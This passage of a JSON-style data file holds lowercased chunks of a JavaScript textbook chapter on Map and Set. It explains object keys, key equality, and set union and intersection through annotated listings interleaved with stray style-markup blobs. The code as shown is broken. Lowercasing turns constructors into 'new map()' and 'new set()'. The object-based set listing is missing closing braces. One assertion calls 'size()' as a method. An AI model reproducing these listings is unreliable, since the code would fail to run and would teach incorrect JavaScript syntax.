if we decide to revisit the first element:  map[firstelement].data  it would be normal to assume that we'd again obtain the information about the first element, but this isn't the case. instead, as figure 9.13 shows, the information about the second element is returned.  figure 9.13. running the code from listing 9.15 shows that objects are converted to strings if we try to use them as object properties.", "javascript-9.2.1.txt__4": "next, when we try to create a mapping for the second element, a similar thing happens. the second element, which is also an html div element, is also converted to a string, and its additional data is also assigned to the [object htmldivelement] property, overriding the value we set for the first element.", "javascript-9.2.2.txt__1": "9.2.2. creating our first map  creating maps is easy: we use a new, built-in map constructor. look at the following example.  listing 9.16. creating our first map  const ninjaislandmap = new map();  #a  const ninja1 = { name: \"yoshi\"};  #b  const ninja2 = { name: \"hattori\"};  #b  const ninja3 = { name: \"kuma\"};  #b  ninjaislandmap.set(ninja1, { homeisland: \"honshu\"});  #c  ninjaislandmap.set(ninja2, { homeisland: \"hokkaido\"});  #c  assert(ninjaislandmap.get(ninja1).homeisland === \"honshu\",  #d  \"the first mapping works\");  #d  assert(ninjaislandmap.get(ninja2).homeisland === \"hokkaido\",  #d  \"the second mapping works\");  #d  assert(ninjaislandmap.get(ninja3) === undefined,  #e  \"there is no mapping for the third ninja!\");  #e  assert(ninjaislandmap.size === 2,  #f  \"we've created two mappings\");  #f  assert(ninjaislandmap.has(ninja1)  #g  && ninjaislandmap.has(ninja2),  #g  \"we have mappings for the first two ninjas\");  #g  assert(!ninjaislandmap.has(ninja3),  #g  \"but not for the third ninja!\");  #g  ninjaislandmap.delete(ninja1);  #h  assert(!ninjaislandmap.has(ninja1)  #h  && ninjaislandmap.size() === 1,  #h  \"there's no first ninja mapping anymore!\");  #h  ninjaislandmap.clear();  #i  assert(ninjaislandmap.size === 0,  #i  \"all mappings have been cleared\");  #i  #a - uses the map constructor to create a map  #b - defines three ninja objects  #c - creates a mapping for the first two ninja objects by using the map set method  #d - gets the mapping for the first two ninja objects by using the map get method  #e - checks that there's no mapping for the third ninja  #f - checks that the map contains mappings for the first two ninjas, but not for the third one!  #g - uses the has method to check whether a mapping for a particular key exists  #h - uses the delete method to delete a key from the map  #i - uses the clear method to completely clear the map  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!  in this example, we create a new map by calling the built-in map constructor:  const ninjaislandmap = new map();  next, we create three ninja objects, cleverly called ninja1, ninja2, and ninja3. we then use the built-in map set method:  ninjaislandmap.set(ninja1, { homeisland: \"honshu\"});  this creates a mapping between a key\u2014in this case, the ninja1 object\u2014and a value\u2014in this case, an object carrying the information about the ninja's home island. we do this for the first two ninjas, ninja1 and ninja2.  in the next step, we obtain the mapping for the first two ninjas by using another built-in map method, get:  assert(ninjaislandmap.get(ninja1).homeisland === \"honshu\",  \"the first mapping works\");  the mapping of course exists for the first two ninjas, but it doesn't exist for the third ninja, because we haven't used the third ninja as an argument to the set method. the current state of the map is shown in figure 9.14.  figure 9.14. a map is a collection of key-value pairs, where a key can be anything\u2014even another object.  in addition to get and set methods, every map also has a built-in size property and has and delete methods. the size property tells us how many mappings we've created. in this case, we've created only two mappings.  the has method, on the other hand, notifies us whether a mapping for a particular key already exists:  ninjaislandmap.has(ninja1); //true  ninjaislandmap.has(ninja3); //false  the delete method enables us to remove items from our map:  ninjaislandmap.delete(ninja1);  one of the fundamental concepts when dealing with maps is determining when two map keys are equal. let's explore this concept.  key equality  if you come from a bit more traditional background, such as c#, java, or python, you may be surprised by the next example.  listing 9.17. key equality in maps  const map = new map();  const currentlocation = location.href;  #a  const firstlink = new url(currentlocation);  #b  const secondlink = new url(currentlocation);  #b  map.set(firstlink, { description: \"firstlink\"});  #c  map.set(secondlink, { description: \"secondlink\"});  #c  assert(map.get(firstlink).description === \"firstlink\",  #d  \"first link mapping\" );  #d  assert(map.get(secondlink).description === \"secondlink\",  #d  \"second link mapping\");  #d  assert(map.size === 2, \"there are two mappings\");  #d  #a - uses the built-in location.href property to get the current page url  #b - creates two links to the current page  #c - adds a mapping for both links  #d - each link gets its own mapping, even though they point to the same page.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-9.2.2.txt__2": "figure 9.15. if we run the code from listing 9.17, we can see that key equality in maps is based on object equality.", "javascript-9.2.3.txt__1": "9.2.3. iterating over maps  so far, you've seen some of the advantages of maps: you can be sure they contain only items that you put in them, and you can use anything as a key. but there's more!", "javascript-9.2.txt__1": "9.2. maps", "javascript-9.3.2.txt__1": "9.3.2. union of sets  a union of two sets, a and b, creates a new set that contains all elements from both a and b. naturally, each item can't occur more than once in the new set.  listing 9.21. using sets to perform a union of collections  const ninjas = [\"kuma\", \"hattori\", \"yagyu\"];  #a  const samurai = [\"hattori\", \"oda\", \"tomoe\"];  #a  const warriors = new set([...ninjas, ...samurai]);  #b  assert(warriors.has(\"kuma\"), \"kuma is here\");  #c  assert(warriors.has(\"hattori\"), \"and hattori\");  #c  assert(warriors.has(\"yagyu\"), \"and yagyu\");  #c  assert(warriors.has(\"oda\"), \"and oda\");  #c  assert(warriors.has(\"tomoe\"), \"tomoe, last but not least\");  #c  assert(warriors.size === 5, \"there are 5 warriors in total\");  #d  #a - creates an array of ninjas and samurai. notice that hattori is both a ninja and a samurai.  #b - creates a new set of warriors by spreading ninjas and samurai  #c - all the ninjas and samurai are included in the new warriors set.  #d - there are no duplicates in the new set. even though hattori is in both the ninjas and samurai sets, he is included only once.  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[]\"}  !@%style%@!", "javascript-9.3.2.txt__2": "in this case, a set is perfect! we don't need to manually keep track of whether an item has been already included: the set takes care of that by itself, automatically. when creating this new set, we use the spread operator [...ninjas, ...samurai] (remember chapter 3) to create a new array that contains all ninjas and all samurai. in case you're wondering, hattori is present twice in this new array. but when we finally pass that array to the set constructor, hattori is included only once, as shown in figure 9.17.", "javascript-9.3.3.txt__1": "9.3.3. intersection of sets  the intersection of two sets, a and b, creates a set that contains elements of a that are also in b. for example, we can find ninjas that are also samurai, as shown next.  listing 9.22. intersection of sets  const ninjas = new set([\"kuma\", \"hattori\", \"yagyu\"]);  const samurai = new set([\"hattori\", \"oda\", \"tomoe\"]);  const ninjasamurais = new set(  [...ninjas].filter(ninja => samurai.has(ninja))  #a  );  assert(ninjasamurais.size === 1, \"there's only one ninja samurai\");  assert(ninjasamurais.has(\"hattori\"), \"hattori is his name\");  #a - uses the spread operator to turn our set into an array so we can use the array's filter method to keep only ninjas that are contained in the samurai set  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":10,\\\"ch\\\":0},{\\\"line\\\":10,\\\"ch\\\":157}]]\"}  !@%style%@!", "javascript-9.3.4.txt__1": "9.3.4. difference of sets", "javascript-9.3.txt__1": "9.3. sets  in many real-world problems, we have to deal with collections of distinct items (meaning each item can't appear more than once) called sets. up to es6, this was something you had to implement yourself by mimicking sets with standard objects. for a crude example, see the next listing.  listing 9.19. mimicking sets with objects  function set(){  this.data = {  };  #a  this.length = 0;  };  #a  set.prototype.has = function(item){  #b  return typeof this.data[item] !== \"undefined\";  #b  };  set.prototype.add = function(item){  if(!this.has(item)){  #c  this.data[item] = true;  #c  this.length++;  #c  #c  };  set.prototype.remove = function(item){  #d  if(this.has(item)){  #d  delete this.data[item];  #d  this.length--;  #d  #d  };  #d  const ninjas = new set();  ninjas.add(\"hattori\");  #e  ninjas.add(\"hattori\");  #e  assert(ninjas.has(\"hattori\") && ninjas.length === 1,  #f  \"our set contains only one hattori\");  #f  ninjas.remove(\"hattori\");  #g  assert(!ninjas.has(\"hattori\") && ninjas.length === 0,  #g  \"our set is now empty\");  #g  #a - uses an object to store items  #b - checks whether the item is already stored  #c - adds an item only if it isn't already contained in the set  #d - removes an item if it's already contained in the set  #e - tries to add hattori twice  #f - checks that hattori was added only once  #g - removes hattori and checks that he was removed from the set  !@%style%@!  {\"css\":\"{\\\"css\\\": \\\"font-weight: bold;\\\"}\",\"target\":\"[[{\\\"line\\\":6,\\\"ch\\\":36},{\\\"line\\\":6,\\\"ch\\\":47}]]\"}  !@%style%@!"}